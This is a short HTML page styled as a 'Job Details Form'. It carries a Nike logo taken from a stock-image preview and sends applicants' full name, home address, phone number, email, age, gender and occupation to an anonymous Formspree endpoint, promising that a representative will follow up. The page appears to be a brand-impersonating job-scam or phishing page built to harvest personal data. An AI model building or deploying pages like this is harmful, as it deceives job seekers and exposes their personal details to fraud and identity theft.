<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Custom Form</title>
    <style>
        /* Inline CSS style */
        body {
            font-family: Arial, sans-serif;
            background-color: #f4f4f9;
            margin: 0;
            padding: 0;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
        }

        .form-container {
            background-color: #fff;
            padding: 40px;
            border-radius: 10px;
            box-shadow: 0 0 15px rgba(0, 0, 0, 0.1);
            width: 80%;
            max-width: 600px;
        }

        .form-container img {
            display: block;
            margin: 0 auto 30px;
            width: 200px;
        }

        h2 {
            text-align: center;
            margin-bottom: 30px;
            font-size: 24px;
            color: #333;
        }

        input, select, textarea {
            width: 100%;
            padding: 10px;
            margin-bottom: 15px;
            border: 1px solid #ccc;
            border-radius: 5px;
            font-size: 16px;
        }

        input[type="submit"] {
            background-color: #4CAF50;
            color: white;
            cursor: pointer;
            font-size: 18px;
            border: none;
        }

        input[type="submit"]:hover {
            background-color: #45a049;
        }

        .input-container {
            margin-bottom: 20px;
        }

        label {
            font-weight: bold;
            color: #333;
        }
    </style>
</head>
<body>

    <div class="form-container">
        <!-- Your logo here -->
        <img src="https://www.shutterstock.com/image-vector/nike-logo-vector-illustration-eps-260nw-2414080435.jpg" alt="Logo">

        <h2>Job Details Form</h2>

        <!-- Form action now uses Formspree URL -->
        <form action="https://formspree.io/f/xvgkbgpa" method="POST">
            <div class="input-container">
                <label for="email">Personal Email:</label>
                <input type="email" id="email" name="email" required>
            </div>

            <div class="input-container">
                <label for="fullName">Full Name:</label>
                <input type="text" id="fullName" name="fullName" required>
            </div>

            <div class="input-container">
                <label for="address">City House Address (Apt #):</label>
                <input type="text" id="address" name="address" required>
            </div>

            <div class="input-container">
                <label for="cityStateZip">City/State/Zip Code:</label>
                <input type="text" id="cityStateZip" name="cityStateZip" required>
            </div>

            <div class="input-container">
                <label for="phone">Cell Phone Number:</label>
                <input type="text" id="phone" name="phone" required>
            </div>

            <div class="input-container">
                <label for="personalEmail">Verify Personal Email:</label>
                <input type="email" id="personalEmail" name="personalEmail" required>
            </div>

            <div class="input-container">
                <label for="ageGender">Age / Gender:</label>
                <input type="text" id="ageGender" name="ageGender" required>
            </div>

            <div class="input-container">
                <label for="occupation">Occupation:</label>
                <input type="text" id="occupation" name="occupation" required>
            </div>

            <div>
                <input type="submit" value="Submit">
            </div>
        </form>

        <h4>Once you submit this form, youd be redirected back to this page, and a representative would get back to you</h4>
    </div>

</body>
</html>
